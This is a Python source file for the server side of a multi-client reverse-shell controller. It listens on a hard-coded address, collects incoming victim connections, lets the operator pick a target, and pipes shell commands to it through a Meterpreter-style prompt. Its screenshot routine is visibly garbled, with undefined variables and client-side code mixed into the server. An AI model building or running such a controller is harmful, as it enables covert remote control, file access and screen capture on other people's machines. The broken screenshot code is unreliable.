import os
import subprocess
import socket
import sys
import pyscreenshot as ImageGrab
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Print help menu
def print_help():
	print("\nhelp  =  Show help menu"'\n'"list  =  Show list connection"'\n'"select  =  Select connection to connected"'\n'"exit  =  Exiting or Stoping all services")


# Print help menu in client
def print_help2():
	print("\n\nhelp = Show help menu\n\nStdapi: File system Commands\n============================\n\n=====Commands=====\ncd        Change directory\nls        List files\ncat        Read the contents of a file to the screen\ncp        Copy source to destination\nmkdir        Make directory\nmv        Move source to destination\npwd        Print working directory\nrm        Delete the specified file\nwhoami        Print user you use\n")

# create socket allow computer to connect
def socket_create():
	try:
		global host
		global port
		global s
		host = '192.168.43.165'
		port = 8905
		s = socket.socket()
	except socket.error as msg:
		print("[-]Socket error: " + str(msg))


# bind socket to port for connections
def socket_bind():
	try:
		global host
		global port
		global s
		print ("[+] Bind socket to port " + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error :" + str(msg))
		time.sleep(5)
		socket_bind()


# accept multiple connection clients
def accept_connections():
	for c in all_connections:
		c.close()
	del all_connections[:]
	del all_addresses[:]
	while 1:
		try:
			conn, address = s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print("\nConnection has been established :" + address[0])
		except:
			print("Error accepting Connections")



# Interactive prompt for sending commands
def start_hello():
	while True:
		cmd = input('hell0_Th3re > ')
		if cmd == 'list':
			list_connections()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		elif cmd == 'help':
			print_help()
		elif cmd == 'exit':
				queue.task_done()
				print('All services shutdown')
				break
		else:
			print("Error Type help for more informations")


# Display all connections
def list_connections():
	results = ''
	for i, conn in enumerate(all_connections):
		try:
			conn.send(str.encode(' '))
			conn.recv(20480)
		except:
			del all_connections[i]
			del all_addresses[i]
			continue
		results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
	print('------ Clients ------' + '\n' + results)


# Select target
def get_target(cmd):
	try:
		target = cmd.replace('select ', '')
		target = int(target)
		conn = all_connections[target]
		print("[+] You are connection to " + str(all_addresses[target][0]))
		print(str(all_addresses[target][0]) + '> ', end="")
		return conn
	except:
		print("Not a valid selection")
		return None


# Connect with remote target
def send_target_commands(conn):
	while True:
		try:
			cmd = input()
			if len(str.encode(cmd)) > 0:
				conn.send(str.encode(cmd))
				client_response = str(conn.recv(20480), "utf-8")
				print(client_response, end="")
			if cmd == 'screenshot':
				list()
			if cmd == 'help':
				print_help2()
			if cmd == 'exit':
				break
		except:
			print("Connection was lost")
			break

def list():
	while str(cmd) == 'screenshot':
		im = ImageGrab.grab()
		im.save('screenshot.png')
		c.send('capturing')
		f = open('screenshot.png', 'rb')
		i = f.read(20480)
		while i != '':
			c.send(i)
			i = f.read(20480)
			f.close()
			c.send('complete')
			os.remove('screenshot.png')
			cmd = c.recv(20480).decode()


			cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
			cmd_str = str(cmd_bytes)
			c.send(cmd_str)

		c.close


# Create worker threads
def create_workers():
	for _  in range(NUMBER_OF_THREADS):
		t = threading.Thread(target=work)
		t.daemon = True
		t.start()

# Do the next job in the queue
def work():
	while True:
		x = queue.get()
		if x == 1:
			socket_create()
			socket_bind()
			accept_connections()
		if x == 2:
			start_hello()
		queue.task_done()


# Job
def create_jobs():
	for x in JOB_NUMBER:
		queue.put(x)
	queue.join()


create_workers()
create_jobs()